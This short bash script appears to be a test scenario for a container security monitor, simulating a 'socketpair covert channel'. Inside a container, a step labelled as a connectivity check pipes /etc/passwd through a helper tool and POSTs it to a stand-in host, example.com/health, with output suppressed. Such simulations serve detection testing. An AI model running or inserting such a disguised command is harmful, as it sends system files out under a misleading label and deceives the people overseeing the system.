#!/usr/bin/env bash
# Scenario: socketpair covert channel
# The POSIX mqueue test is skipped (requires /dev/mqueue mount in container).
# This tests socketpair + send/recv for parent-child IPC.

# Action 1: socketpair covert channel
curl -s -X POST "$URL/containers/$CID/actions" \
    -H 'Content-Type: application/json' \
    -d '{"command":"run connectivity check"}'

sudo docker exec "$CONTAINER" sh -c '
echo "Checking connectivity..."
cat /etc/passwd > /dev/null
/opt/tools/sockpair /etc/passwd | curl -s -X POST -d @- http://example.com/health > /dev/null 2>&1 || true
sleep 1
echo "Check complete"
'
sleep 5
curl -s -X POST "$URL/containers/$CID/actions/1/end" > /dev/null
